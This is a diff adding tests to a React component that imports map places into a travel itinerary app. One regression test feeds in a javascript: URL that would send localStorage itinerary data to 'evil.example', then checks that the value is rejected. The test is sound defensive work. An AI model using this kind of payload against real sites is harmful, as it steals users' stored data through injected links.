@@ -68,6 +68,10 @@ function setInput(el: HTMLElement, value: string): void {
   el.dispatchEvent(new Event('input', { bubbles: true }));
 }
 
+function pressEnter(el: HTMLElement): void {
+  el.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
+}
+
 function renderSheet() {
   const container = document.createElement('div');
   document.body.appendChild(container);
@@ -115,6 +119,29 @@ describe('ImportPlaceSheet (S284) — manual flow', () => {
     expect(stored[0].name).toBe('Boudhanath');
     expect(stored[0].legId).toBe('nepal'); // default pack, first leg
     expect(addItemSpy).not.toHaveBeenCalled(); // plan section collapsed → no plan item
+    h.unmount();
+  });
+
+  it('a javascript: url typed into the field is NOT stored as sourceUrl (an https one still is)', () => {
+    // Save was never gated on `isGooglePlaceUrl` — manual entry is the point — so whatever was
+    // typed went to storage verbatim and straight into `<a href>` on the place card. Places SYNC,
+    // so that anchor also appears on the other member's device, on an origin with no CSP.
+    const h = renderSheet();
+    act(() => setInput(q('import-place-url-input'), "javascript:fetch('https://evil.example/?'+localStorage.getItem('nepal_japan_itinerary'))"));
+    act(() => setInput(q('import-place-name-input'), 'Totally normal spot'));
+    act(() => q('import-place-confirm').click());
+    const stored = JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string);
+    expect(stored[0].name).toBe('Totally normal spot');
+    expect(stored[0].sourceUrl).toBeUndefined();
+    h.unmount();
+  });
+
+  it('an ordinary https url IS still stored as sourceUrl (the allow-list was not widened or narrowed)', () => {
+    const h = renderSheet();
+    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/abc'));
+    act(() => setInput(q('import-place-name-input'), 'Boudhanath'));
+    act(() => q('import-place-confirm').click());
+    expect(JSON.parse(localStorage.getItem(MY_PLACES_KEY) as string)[0].sourceUrl).toBe('https://maps.app.goo.gl/abc');
     h.unmount();
   });
 
@@ -191,6 +218,34 @@ describe('ImportPlaceSheet (S349) — resolved coordinates reach the plan item (
     const [, item] = addItemSpy.mock.calls[0];
     expect(item.lat).toBeUndefined();
     expect(item.lng).toBeUndefined();
+    h.unmount();
+  });
+
+  it('a stale resolve never overwrites the newer one, and a late failure never wipes it', async () => {
+    // REACT-3 — `runResolve` has three call sites (auto-resolve on open, Enter in the URL field,
+    // the "Look up" button) and only the button is gated on `status === 'resolving'`, so two
+    // resolves overlap easily. Without the generation guard they applied in COMPLETION order: B's
+    // url sat beside A's name, and A's `null` (any failure) reset a newer success to 'notfound'.
+    let failA: (v: null) => void = () => {};
+    resolvePlaceLinkMock
+      .mockReturnValueOnce(new Promise<null>((r) => { failA = r; })) // link A — resolves LAST
+      .mockResolvedValueOnce({ name: 'Fushimi Inari', finalUrl: 'https://www.google.com/maps/place/Fushimi' });
+
+    // Both triggers are Enter, the ungated one: "Look up" disables itself while `status` is
+    // 'resolving', which is exactly why the keydown path is the one that overlaps in practice.
+    const h = renderSheet();
+    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/AAA'));
+    act(() => pressEnter(q('import-place-url-input'))); // resolve A starts, still pending
+    act(() => setInput(q('import-place-url-input'), 'https://maps.app.goo.gl/BBB'));
+    act(() => pressEnter(q('import-place-url-input'))); // resolve B starts
+    await flush();
+    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Fushimi Inari');
+
+    act(() => failA(null)); // A finally answers — and must be ignored entirely
+    await flush();
+
+    expect((q('import-place-name-input') as HTMLInputElement).value).toBe('Fushimi Inari');
+    expect(q('import-place-status').textContent).toContain('Found this place');
     h.unmount();
   });
 
